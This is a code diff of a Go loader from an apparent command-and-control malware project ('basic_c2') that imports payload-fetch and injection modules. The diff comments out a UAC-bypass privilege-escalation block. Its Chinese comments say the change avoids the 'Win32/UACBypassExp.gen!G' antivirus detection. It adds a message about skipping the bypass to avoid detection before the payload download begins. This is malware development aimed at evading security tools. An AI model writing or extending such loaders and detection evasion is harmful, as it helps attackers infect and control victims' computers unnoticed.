@@ -2,7 +2,6 @@ package main
 
 import (
 	"basic_c2/internal/config"
-	"basic_c2/internal/privilege"
 	"basic_c2/loader/fetch"
 	"basic_c2/loader/inject"
 	"fmt"
@@ -28,16 +27,19 @@ func main() {
 		}
 	}
 
-	// 3. 如果无管理员权限，尝试提权
-	if !privilege.IsAdmin() {
-		fmt.Println("[*] 检测到普通用户权限，尝试提权...")
-		if privilege.ElevateAndRestart() {
-			fmt.Println("[+] 提权成功，等待以管理员权限重启...")
-			time.Sleep(2 * time.Second)
-			return // 等待提权后的进程启动
+	/*
+		// 3. 如果无管理员权限，尝试提权 (已注释：规避 Win32/UACBypassExp.gen!G 查杀)
+		if !privilege.IsAdmin() {
+			fmt.Println("[*] 检测到普通用户权限，尝试提权...")
+			if privilege.ElevateAndRestart() {
+				fmt.Println("[+] 提权成功，等待以管理员权限重启...")
+				time.Sleep(2 * time.Second)
+				return // 等待提权后的进程启动
+			}
+			fmt.Println("[-] 提权失败，以普通权限继续运行")
 		}
-		fmt.Println("[-] 提权失败，以普通权限继续运行")
-	}
+	*/
+	fmt.Println("[*] Skipping UAC Bypass to avoid detection. Running as user.")
 
 	// 4. 下载 Payload
 	fmt.Println("[*] 开始下载 Payload...")
